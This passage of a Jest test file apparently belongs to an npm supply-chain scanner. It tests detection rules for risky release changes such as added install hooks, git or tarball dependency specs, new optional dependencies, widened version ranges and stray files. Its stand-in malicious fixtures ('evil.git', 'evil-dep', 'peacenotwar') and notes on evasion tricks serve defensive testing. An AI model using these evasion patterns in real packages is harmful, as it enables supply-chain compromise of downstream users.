        dependencies: { a: "1.0.0" },
        main: "index.js",
      },
      {
        name: "pkg",
        version: "1.0.1",
        scripts: { postinstall: "node install.js" },
        dependencies: { a: "1.1.0", b: "2.0.0" },
        main: "dist/index.js",
      },
    );

    expect(summary.previousVersion).toBe("1.0.0");
    expect(summary.stagedVersion).toBe("1.0.1");
    expect(summary.scripts).toEqual([
      { key: "postinstall", status: "added", staged: "node install.js" },
    ]);
    expect(summary.entrypointsChanged).toBe(true);
  });

  test("diffs bin commands and flags newly added executables", () => {
    const objectForm = summarizePackageJsonDiff(
      { name: "tool", version: "1.0.0" },
      { name: "tool", version: "1.0.1", bin: { tool: "cli.js", helper: "helper.js" } },
    );
    expect(objectForm.bin).toEqual([
      { key: "helper", status: "added", staged: "helper.js" },
      { key: "tool", status: "added", staged: "cli.js" },
    ]);

    // A string bin installs one command named after the package (unscoped part).
    const stringForm = summarizePackageJsonDiff(
      { name: "@scope/tool", version: "1.0.0" },
      { name: "@scope/tool", version: "1.0.1", bin: "cli.js" },
    );
    expect(stringForm.bin).toEqual([{ key: "tool", status: "added", staged: "cli.js" }]);

    expect(packageJsonDiffFindings(objectForm)).toEqual([
      expect.objectContaining({
        ruleId: "diff.bin-added",
        severity: "medium",
        evidence: "bin helper: helper.js",
      }),
      expect.objectContaining({
        ruleId: "diff.bin-added",
        severity: "medium",
        evidence: "bin tool: cli.js",
      }),
    ]);

    // A bin command whose target only moves (build-path churn) is not flagged.
    const retarget = summarizePackageJsonDiff(
      { name: "tool", version: "1.0.0", bin: { tool: "cli.js" } },
      { name: "tool", version: "1.0.1", bin: { tool: "dist/cli.js" } },
    );
    expect(retarget.bin).toEqual([
      { key: "tool", status: "modified", previous: "cli.js", staged: "dist/cli.js" },
    ]);
    expect(packageJsonDiffFindings(retarget)).toEqual([]);
  });

  test("flags unusual dependency specs in package json diffs", () => {
    const diff = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { safe: "^1.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: {
          safe: "github:example/safe#main",
          remote: "https://example.invalid/pkg.tgz",
          local: "file:../local.tgz",
          alias: "npm:other-package@^1.0.0",
        },
      },
    );

    const findings = packageJsonDiffFindings(diff);

    expect(findings).toEqual([
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        evidence: "alias: npm:other-package@^1.0.0",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "local: file:../local.tgz",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "remote: https://example.invalid/pkg.tgz",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "safe: github:example/safe#main",
        ruleId: "dependency.unusual-spec",
      }),
    ]);
    // A plain registry-spec addition is no longer silent, but it downgrades to
    // the generic dependency.added rule instead of unusual-spec.
    expect(
      packageJsonDiffFindings({
        ...diff,
        dependencies: [{ key: "safe", status: "added", staged: "^1.0.0", section: "dependencies" }],
      }),
    ).toEqual([
      expect.objectContaining({
        ruleId: "dependency.added",
        severity: "medium",
        evidence: "safe: ^1.0.0",
      }),
    ]);
  });

  test("flags added dependencies and major version bumps", () => {
    const stagedPackageJsonText = `{
  "name": "pkg",
  "version": "11.0.0",
  "dependencies": {
    "event-pubsub": "5.0.0",
    "js-message": "1.0.3",
    "peacenotwar": "^9.1.3"
  }
}`;
    const diff = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "9.2.1",
        dependencies: { "event-pubsub": "4.3.0", "js-message": "1.0.3" },
      },
      JSON.parse(stagedPackageJsonText),
    );

    const findings = packageJsonDiffFindings(diff, stagedPackageJsonText);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "dependency.major-bump",
        severity: "low",
        file: "package.json",
        line: 5,
        evidence: "event-pubsub: 4.3.0 -> 5.0.0",
      }),
      expect.objectContaining({
        ruleId: "dependency.added",
        severity: "medium",
        file: "package.json",
        line: 7,
        evidence: "peacenotwar: ^9.1.3",
      }),
    ]);
  });

  test("dependency added and bump rules stay quiet on routine changes", () => {
    // Patch/minor bumps within the same major, removed deps, and unchanged deps
    // raise nothing.
    const routine = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        dependencies: { same: "^1.0.0", minor: "^1.1.0", gone: "^2.0.0" },
      },
      { name: "pkg", version: "1.0.1", dependencies: { same: "^1.0.0", minor: "^1.2.4" } },
    );
    expect(packageJsonDiffFindings(routine)).toEqual([]);

    // An added optional dependency keeps the single higher-severity
    // optional-added finding rather than stacking dependency.added on top.
    const optional = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0" },
      { name: "pkg", version: "1.0.1", optionalDependencies: { maybe: "^2.0.0" } },
    );
    expect(packageJsonDiffFindings(optional).map((finding) => finding.ruleId)).toEqual([
      "dependency.optional-added",
    ]);

    // Specs without a version anchor (dist-tags, wildcards, bare `>` ranges)
    // cannot prove a major boundary crossing and stay quiet.
    const unanchored = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        dependencies: { tagged: "latest", wild: "*", open: ">1.0.0" },
      },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { tagged: "next", wild: "2.0.0", open: ">3.0.0" },
      },
    );
    expect(packageJsonDiffFindings(unanchored)).toEqual([]);
  });

  test("dependency delta rules stay silent without a baseline manifest", () => {
    // A first-ever publish (or a degraded baseline fetch) diffs every dep as
    // "added"; that is not the added-dependency vector, and flagging the whole
    // list would floor every first release at medium risk.
    const firstPublish = summarizePackageJsonDiff(undefined, {
      name: "pkg",
      version: "1.0.0",
      dependencies: { "left-pad": "^1.3.0", "event-pubsub": "4.3.0" },
      peerDependencies: { preact: "^10.0.0" },
      optionalDependencies: { fsevents: "^2.0.0" },
    });

    const ruleIds = packageJsonDiffFindings(firstPublish).map((finding) => finding.ruleId);

    // optional-added still fires: it describes the staged manifest itself,
    // not the delta against a previous release.
    expect(ruleIds).toEqual(["dependency.optional-added"]);
  });

  test("treats a section move as a modification, not a new dependency", () => {
    // Same spec moved optionalDependencies -> dependencies: nothing new ships.
    const pureMove = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", optionalDependencies: { fsevents: "^2.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { fsevents: "^2.0.0" } },
    );
    expect(packageJsonDiffFindings(pureMove)).toEqual([]);

    // A move that also crosses a major boundary reports the bump, with the
    // removed section's spec as the previous side.
    const moveWithBump = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", optionalDependencies: { fsevents: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { fsevents: "^2.0.0" } },
    );
    expect(packageJsonDiffFindings(moveWithBump)).toEqual([
      expect.objectContaining({
        ruleId: "dependency.major-bump",
        evidence: "fsevents: ^1.0.0 -> ^2.0.0",
      }),
    ]);

    // Moving a dependency into optionalDependencies is still a relocation, so
    // the high optional-added finding does not fire on already-shipped code.
    const moveIntoOptional = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { fsevents: "^2.0.0" } },
      { name: "pkg", version: "1.0.1", optionalDependencies: { fsevents: "^2.0.0" } },
    );
    expect(packageJsonDiffFindings(moveIntoOptional)).toEqual([]);

    // npm 7+ auto-installs required peers, so moving a required peer into
    // dependencies does not start shipping code that was absent before.
    const peerToRuntime = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", peerDependencies: { lodash: "^4.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { lodash: "^4.0.0" } },
    );
    expect(packageJsonDiffFindings(peerToRuntime)).toEqual([]);

    // A different peer range can resolve different bytes, so moving that key
    // into dependencies must not inherit the unchanged-relocation exemption.
    const peerToDifferentRuntime = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", peerDependencies: { lodash: "^3.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { lodash: "^4.0.0" },
        peerDependencies: { lodash: "^4.0.0" },
      },
    );
    expect(packageJsonDiffFindings(peerToDifferentRuntime)).toEqual([
      expect.objectContaining({ ruleId: "dependency.added", evidence: "lodash: ^4.0.0" }),
    ]);
  });

  test("emits one finding per dependency key across sections", () => {
    // The common dependencies + peerDependencies pairing must not double-flag.
    const bothSections = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0" },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { react: "^18.0.0" },
        peerDependencies: { react: "^18.0.0" },
      },
    );
    expect(packageJsonDiffFindings(bothSections)).toEqual([
      expect.objectContaining({ ruleId: "dependency.added", evidence: "react: ^18.0.0" }),
    ]);

    // A genuinely new optional+runtime listing keeps only the higher-severity
    // optional-added finding.
    const optionalAndRuntime = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0" },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { sharp: "^0.33.0" },
        optionalDependencies: { sharp: "^0.33.0" },
      },
    );
    expect(packageJsonDiffFindings(optionalAndRuntime)).toEqual([
      expect.objectContaining({ ruleId: "dependency.optional-added", evidence: "sharp: ^0.33.0" }),
    ]);

    // optionalDependencies overrides a same-named dependencies entry, so the
    // high finding must cite the effective optional spec rather than the
    // lower-ranked runtime row.
    const differentOptionalSpec = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0" },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { sharp: "^0.32.0" },
        optionalDependencies: { sharp: "^0.33.0" },
      },
    );
    expect(packageJsonDiffFindings(differentOptionalSpec)).toEqual([
      expect.objectContaining({ ruleId: "dependency.optional-added", evidence: "sharp: ^0.33.0" }),
    ]);

    // An unusual spec in ANY changed section outranks the added/bump rules:
    // npm 7+ installs peer dependencies too, so a git spec added under
    // peerDependencies must not hide behind a benign spec in dependencies and
    // downgrade the key to the medium added finding.
    const unusualBehindBenign = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { evil: "^1.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { evil: "^2.0.0" },
        peerDependencies: { evil: "git+https://example.invalid/evil.git" },
      },
    );
    expect(packageJsonDiffFindings(unusualBehindBenign)).toEqual([
      expect.objectContaining({
        ruleId: "dependency.unusual-spec",
        severity: "high",
        evidence: "evil: git+https://example.invalid/evil.git",
      }),
    ]);
  });

  test("does not treat a duplicate declaration as a new dependency", () => {
    const existingRuntimeGetsPeer = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { react: "^18.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { react: "^18.0.0" },
        peerDependencies: { react: "^18.0.0" },
      },
    );
    expect(existingRuntimeGetsPeer.dependencies).toEqual([
      {
        key: "react",
        status: "added",
        staged: "^18.0.0",
        section: "peerDependencies",
        previouslyDeclared: true,
        previouslyInstalled: true,
        previousInstalledSpec: "^18.0.0",
        previousDeclaredSpecs: ["^18.0.0"],
      },
    ]);
    expect(packageJsonDiffFindings(existingRuntimeGetsPeer)).toEqual([]);

    const existingRuntimeGetsNewMajorPeer = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { react: "^18.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { react: "^18.0.0" },
        peerDependencies: { react: "^19.0.0" },
      },
    );
    expect(packageJsonDiffFindings(existingRuntimeGetsNewMajorPeer)).toEqual([
      expect.objectContaining({
        ruleId: "dependency.major-bump",
        evidence: "react: ^18.0.0 -> ^19.0.0",
      }),
    ]);

    // A required peer was already installed by npm 7+, even if the package
    // now duplicates the declaration under dependencies.
    const existingPeerGetsRuntime = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", peerDependencies: { react: "^18.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { react: "^18.0.0" },
        peerDependencies: { react: "^18.0.0" },
      },
    );
    expect(existingPeerGetsRuntime.dependencies).toEqual([
      {
        key: "react",
        status: "added",
        staged: "^18.0.0",
        section: "dependencies",
        previouslyDeclared: true,
        previouslyInstalled: true,
        previousRequiredPeerSpec: "^18.0.0",
      },
    ]);
    expect(packageJsonDiffFindings(existingPeerGetsRuntime)).toEqual([]);

    const optionalPeerGetsRuntime = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        peerDependencies: { react: "^18.0.0" },
        peerDependenciesMeta: { react: { optional: true } },
      },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { react: "^18.0.0" },
        peerDependencies: { react: "^18.0.0" },
        peerDependenciesMeta: { react: { optional: true } },
      },
    );
    expect(packageJsonDiffFindings(optionalPeerGetsRuntime)).toEqual([
      expect.objectContaining({ ruleId: "dependency.added", evidence: "react: ^18.0.0" }),
    ]);
  });

  test("compares an added optional override with the previous installed spec", () => {
    const optionalOverride = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { dep: "^1.0.0" },
        optionalDependencies: { dep: "^2.0.0" },
      },
    );

    expect(optionalOverride.dependencies).toEqual([
      {
        key: "dep",
        status: "added",
        staged: "^2.0.0",
        section: "optionalDependencies",
        previouslyDeclared: true,
        previouslyInstalled: true,
        previousInstalledSpec: "^1.0.0",
      },
    ]);
    expect(packageJsonDiffFindings(optionalOverride)).toEqual([
      expect.objectContaining({
        ruleId: "dependency.major-bump",
        evidence: "dep: ^1.0.0 -> ^2.0.0",
      }),
    ]);
  });

  test("does not report newly added optional peer dependencies as mandatory", () => {
    const optionalPeer = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0" },
      {
        name: "pkg",
        version: "1.0.1",
        peerDependencies: { dep: "^1.0.0" },
        peerDependenciesMeta: { dep: { optional: true } },
      },
    );

    expect(optionalPeer.dependencies).toEqual([
      {
        key: "dep",
        status: "added",
        staged: "^1.0.0",
        section: "peerDependencies",
        stagedPeerOptional: true,
      },
    ]);
    expect(packageJsonDiffFindings(optionalPeer)).toEqual([]);

    const optionalGitPeer = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0" },
      {
        name: "pkg",
        version: "1.0.1",
        peerDependencies: { dep: "git+https://example.invalid/dep.git" },
        peerDependenciesMeta: { dep: { optional: true } },
      },
    );
    expect(packageJsonDiffFindings(optionalGitPeer)).toEqual([]);
  });

  test("tracks optional peer changes and required transitions", () => {
    const modifiedOptionalPeer = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        peerDependencies: { dep: "^1.0.0" },
        peerDependenciesMeta: { dep: { optional: true } },
      },
      {
        name: "pkg",
        version: "1.0.1",
        peerDependencies: { dep: "git+https://example.invalid/dep.git" },
        peerDependenciesMeta: { dep: { optional: true } },
      },
    );
    expect(modifiedOptionalPeer.dependencies).toEqual([
      {
        key: "dep",
        status: "modified",
        previous: "^1.0.0",
        staged: "git+https://example.invalid/dep.git",
        section: "peerDependencies",
        previousPeerOptional: true,
        stagedPeerOptional: true,
      },
    ]);
    expect(packageJsonDiffFindings(modifiedOptionalPeer)).toEqual([]);

    const optionalBecomesRequired = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        peerDependencies: { dep: "^1.0.0" },
        peerDependenciesMeta: { dep: { optional: true } },
      },
      {
        name: "pkg",
        version: "1.0.1",
        peerDependencies: { dep: "^1.0.0" },
      },
    );
    expect(optionalBecomesRequired.dependencies).toEqual([
      {
        key: "dep",
        status: "modified",
        previous: "^1.0.0",
        staged: "^1.0.0",
        section: "peerDependencies",
        previousPeerOptional: true,
      },
    ]);
    expect(packageJsonDiffFindings(optionalBecomesRequired)).toEqual([
      expect.objectContaining({
        ruleId: "dependency.added",
        evidence: "dep: ^1.0.0",
      }),
    ]);

    const alreadyInstalledPeerBecomesRequired = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        dependencies: { dep: "^1.0.0" },
        peerDependencies: { dep: "^1.0.0" },
        peerDependenciesMeta: { dep: { optional: true } },
      },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { dep: "^1.0.0" },
        peerDependencies: { dep: "^1.0.0" },
      },
    );
    expect(packageJsonDiffFindings(alreadyInstalledPeerBecomesRequired)).toEqual([]);

    const requiredBecomesOptional = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        peerDependencies: { dep: "^1.0.0" },
      },
      {
        name: "pkg",
        version: "1.0.1",
        peerDependencies: { dep: "^1.0.0" },
        peerDependenciesMeta: { dep: { optional: true } },
      },
    );
    expect(packageJsonDiffFindings(requiredBecomesOptional)).toEqual([]);
  });

  test("gates delta rules on baseline-manifest presence, not its version string", () => {
    // A prior release whose manifest parsed but declared no version must not be
    // able to switch off the next release's added/major-bump checks.
    const prevWithoutVersion = summarizePackageJsonDiff(
      { name: "pkg", dependencies: { existing: "^1.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { existing: "^2.0.0", "evil-dep": "^1.0.0" },
      },
    );
    const ruleIds = packageJsonDiffFindings(prevWithoutVersion)
      .map((finding) => finding.ruleId)
      .sort();
    expect(ruleIds).toEqual(["dependency.added", "dependency.major-bump"]);
  });

  test("major-bump follows the highest major a union admits, not its floor", () => {
    // npm installs the highest published version a spec admits, so widening
    // "^1.0.0" to a union that now admits 2.x ships 2.x to consumers even
    // though 1.x is still in range — that is a major change worth flagging.
    const unionAdmitsNewMajor = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "^2.0.0 || ^1.0.0" } },
    );
    expect(packageJsonDiffFindings(unionAdmitsNewMajor)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);

    // A no-op "|| " suffix (or an unparseable leading branch) must not suppress
    // the comparison: the parseable branch still admits major 9.
    const unionEvasion = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "^9.0.0 || " } },
    );
    expect(packageJsonDiffFindings(unionEvasion)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);

    // A union whose highest admitted major is unchanged raises nothing.
    const unionSameMajor = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "~1.2.0 || ^1.5.0" } },
    );
    expect(packageJsonDiffFindings(unionSameMajor)).toEqual([]);

    // A hyphen range installs up to its high endpoint, and a bare ">=" with no
    // upper bound admits every future major — widening into either form fires.
    const hyphenWidening = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "1.0.0 - 2.0.0" } },
    );
    expect(packageJsonDiffFindings(hyphenWidening)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);
    const unboundedWidening = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: ">=1.0.0" } },
    );
    expect(packageJsonDiffFindings(unboundedWidening)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);

    // A downgrade admits a major the prior range never did and fires; a pure
    // narrowing stays inside the previously reviewed span and stays quiet, as
    // does a rewrite whose upper-bound comparator keeps ">=" finite.
    const downgrade = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^2.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "^1.0.0" } },
    );
    expect(packageJsonDiffFindings(downgrade)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);
    const upperOnlyDowngrade = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^2.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "<=1.9.9" } },
    );
    expect(packageJsonDiffFindings(upperOnlyDowngrade)).toEqual([
      expect.objectContaining({
        ruleId: "dependency.major-bump",
        evidence: "dep: ^2.0.0 -> <=1.9.9",
      }),
    ]);
    const narrowing = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: ">=1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "^1.0.0" } },
    );
    expect(packageJsonDiffFindings(narrowing)).toEqual([]);
    const boundedRewrite = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: ">=1.0.0 <2.0.0" } },
    );
    expect(packageJsonDiffFindings(boundedRewrite)).toEqual([]);

    // A higher upper bound admits 2.x and must not be collapsed to the 1.x
    // floor of the comparator set.
    const boundedWidening = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: ">=1.0.0 <3.0.0" } },
    );
    expect(packageJsonDiffFindings(boundedWidening)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);

    // Comparator sets are intersections, so reordering the upper and lower
    // bounds must not hide the newly admitted major.
    const reorderedComparators = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "<3.0.0 >=1.0.0" } },
    );
    expect(packageJsonDiffFindings(reorderedComparators)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);

    // Comparator-set intersections use the strongest lower bound. The previous
    // range admits only 2.x, so moving to 1.x is a downgrade even though an
    // earlier redundant comparator mentioned 1.x.
    const strongestLowerBound = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: ">=1 >=2 <3" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "^1.0.0" } },
    );
    expect(packageJsonDiffFindings(strongestLowerBound)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);

    // Disjoint unions must keep their holes: the previous range admitted 1.x
    // and 3.x, but never the staged 2.x major.
    const unionHole = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { dep: "^1.0.0 || ^3.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { dep: "^2.0.0" } },
    );
    expect(packageJsonDiffFindings(unionHole)).toEqual([
      expect.objectContaining({ ruleId: "dependency.major-bump" }),
    ]);

    // Every modified row compares its own spec pair: a major change confined
    // to the peer row of a dependencies + peerDependencies pairing cannot hide
    // behind an unchanged-major dependencies row.
    const peerRowBump = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        dependencies: { dep: "^1.0.0" },
        peerDependencies: { dep: "^1.0.0" },
      },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: { dep: "^1.1.0" },
        peerDependencies: { dep: "^2.0.0" },
      },
    );
    expect(packageJsonDiffFindings(peerRowBump)).toEqual([
      expect.objectContaining({
        ruleId: "dependency.major-bump",
        evidence: "dep: ^1.0.0 -> ^2.0.0",
      }),
    ]);

    // npm treats an empty spec like "*" — the loosest range must not be the
    // one silent path through the added rule.
    const emptySpec = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { anchor: "1.0.0" } },
      { name: "pkg", version: "1.0.1", dependencies: { anchor: "1.0.0", loose: "" } },
    );
    expect(packageJsonDiffFindings(emptySpec)).toEqual([
      expect.objectContaining({ ruleId: "dependency.added", evidence: "loose: " }),
    ]);
  });

  test("flags files outside package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 72,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist", flags: [], textSample: "export {};" },
      {
        path: "router_init.js",
        size: 2048,
        sha256: "payload",
        flags: [],
        textSample: "console.log('init');",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "router_init.js",
        evidence: "new/changed added file: file is not matched by package.json files allowlist",
        ruleId: "file.outside-files-list",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("does not flag prepare as a consumer install lifecycle hook", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.1",
          scripts: { prepare: "husky && npm run test:install && run-s build" },
        }),
      },
    ];

    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle" }),
    );
  });

  test("matches glob entries in package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 77,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist/*.js"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist-js", flags: [], textSample: "export {};" },
      { path: "dist/style.css", size: 9, sha256: "dist-css", flags: [], textSample: "body {}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({ file: "dist/style.css", ruleId: "file.outside-files-list" }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("flags newly added optional dependencies", () => {
    const stagedPackageJsonText = `{
  "name": "pkg",
  "version": "1.0.1",
  "optionalDependencies": {
    "existing": "^1.0.0",
    "maybe": "^2.0.0"
  }
}`;
    const diff = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", optionalDependencies: { existing: "^1.0.0" } },
      JSON.parse(stagedPackageJsonText),
    );

    const findings = packageJsonDiffFindings(diff, stagedPackageJsonText);

    expect(diff.dependencies).toContainEqual({
      key: "maybe",
      status: "added",
      staged: "^2.0.0",
      section: "optionalDependencies",
    });
    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        line: 6,
        evidence: "maybe: ^2.0.0",
        ruleId: "dependency.optional-added",
      }),
    );
  });

  test("flags npm's implicit node-gyp install hook from root gyp files", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "binding.gyp",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
  });

  test("marks implicit node-gyp as release delta when package.json newly enables it", () => {
    const previous = [
      {
        path: "package.json",
        size: 70,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0", gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(diff.find((entry) => entry.path === "binding.gyp")?.status).toBe("unchanged");
    expect(annotated).toContainEqual(
      expect.objectContaining({
        file: "binding.gyp",
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: true,
      }),
    );
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });

  test("keeps pre-existing implicit node-gyp findings contextual when only package metadata changes", () => {
    const previous = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated).toContainEqual(
      expect.objectContaining({
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: false,
      }),
    );
  });

  test("does not flag implicit node-gyp when npm suppressors are present", () => {
    const withPreinstall = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node setup.js" } }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const withGypfileFalse = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];

    expect(
      deterministicFindings(withPreinstall, createPackageDiff([], withPreinstall)),
    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
    expect(
      deterministicFindings(withGypfileFalse, createPackageDiff([], withGypfileFalse)),
